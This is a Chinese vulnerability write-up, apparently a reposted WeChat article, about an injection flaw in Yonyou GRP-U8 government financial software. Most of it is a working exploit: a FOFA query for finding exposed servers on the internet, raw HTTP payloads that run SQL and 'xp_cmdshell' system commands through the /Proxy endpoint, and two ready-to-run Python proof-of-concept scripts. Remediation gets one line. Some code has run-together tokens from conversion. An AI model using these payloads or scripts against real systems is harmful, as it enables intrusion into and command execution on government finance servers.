> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/xFGBEigTXQxMo0em4gzV0Q)

### **一、漏洞介绍**

 用友 GRP-U8 行政事业财务管理软件是用友公司专注于国家电子政务事业，基于云计算技术所推出的新一代产品，是我国行政事业财务领域最专业的政府财务管理软件。用友 GRP-u8 被曝存在 XXE 漏洞，该漏洞源于应用程序解析 XML 输入时没有限制外部实体的加载，导致可加载恶意外部文件，可以执行 SQL 语句，甚至可以执行系统命令。

### **二、影响版本**

**GRP-U8**

### **三、漏洞复现**

#### 1. 环境搭建

fofa 语法

title="GRP-U8"

#### 2. 漏洞复现

(1): 执行 SQL 语句 payload

POST/Proxy HTTP/1.1  
Host: xxx.xxx.xxx.xxx  
Upgrade-Insecure-Requests: 1  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102Safari/537.36  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
Accept-Encoding: gzip, deflate  
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8  
Cookie: JSESSIONID=25EDA97813692F4D1FAFBB74FD7CFFE0  
Connection: close  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 386  
   
cVer=9.8.0&dp=<?xml version="1.0"encoding="GB2312"?><R9PACKETversion="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATAformat="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATAformat="text">select@@version</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaV90ZgbJcCFIkrHEkfy7rbgr0vic8FYm8C9QZdqicv9JyG0kPwQXNZZ4TgXr9GQ8icUmuNJ6YH4Zl9g/640?wx_fmt=png)

(2): 执行 SQL 语句脚本

```
import re 
import requests 
import sys 
 
iflen(sys.argv) !=2: 
    print("Usage: python poc.py url") 
    print("example: python poc.py http://127.0.0.1:8080") 
    sys.exit(1) 
url = sys.argv[1] 
headers = { 
    "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36", 
    "Content-Type":"application/x-www-form-urlencoded", 
} 
def poc(url): 
    url = url +'/Proxy'
    print(url) 
    data ='cVer=9.8.0&dp=<?xmlversion="1.0" encoding="GB2312"?><R9PACKETversion="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATAformat="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATAformat="text">select@@version</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>'
    res = requests.post(url,headers=headers,data=data) 
    res = res.text 
    result_row =r'<ROW COLUMN1="(.*?)"'
    ROW = re.findall(result_row,res,re.S| re.M) 
    print(ROW[0]) 
if__name__=="__main__": 
    poc(sys.argv[1])
```

(3): 使用方法

python3GRP-U8.py url

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaV90ZgbJcCFIkrHEkfy7rb3Zr0xnoclTbxhGQBEJv3WfFgoKiaIibic63n0vLdssqq7A8KyAEoAiahJg/640?wx_fmt=png)

(4): 执行命令 payload

POST/Proxy HTTP/1.1  
Host: xxx.xxx.xxx.xxx  
Upgrade-Insecure-Requests: 1  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102Safari/537.36  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
Accept-Encoding: gzip, deflate  
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8  
Cookie: JSESSIONID=25EDA97813692F4D1FAFBB74FD7CFFE0  
Connection: close  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 357  
   
cVer=9.8.0&dp=<?xml version="1.0"encoding="GB2312"?><R9PACKETversion="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATAformat="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATAformat="text">exec xp_cmdshell'whoami'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaV90ZgbJcCFIkrHEkfy7rbONyrHibCbaWKhZTSGp4t5Bkg9libyIAATqxjd3zMb8R2sf9bHUspjkdA/640?wx_fmt=png)

(5): 执行命令脚本

```
import re 
import requests 
import sys 
 
iflen(sys.argv) !=2: 
    print("Usage: python poc.py url") 
    print("example: python poc.py http://127.0.0.1:8080") 
    sys.exit(1) 
url = sys.argv[1] 
headers = { 
    "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36", 
    "Content-Type":"application/x-www-form-urlencoded", 
} 
def poc(url): 
    url = url +'/Proxy'
    print(url) 
    data ='cVer=9.8.0&dp=<?xmlversion="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATAformat="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATAformat="text">exec xp_cmdshell"whoami"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>'
    res = requests.post(url,headers=headers,data=data) 
    res = res.text 
    result_row =r'<ROW output="(.*?)"'
    ROW = re.findall(result_row,res,re.S| re.M) 
    print(ROW[0]) 
if__name__=="__main__": 
    poc(sys.argv[1])
```

(6): 使用方法

python3GRP-U8.py url

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaV90ZgbJcCFIkrHEkfy7rbuWunwTBgpWC5jsAcBAEFLtZQCRgqJhiar7nX4yVsIFz5tnLNrHzkAiag/640?wx_fmt=png)

### 四、修复建议

1. 升级到安全版本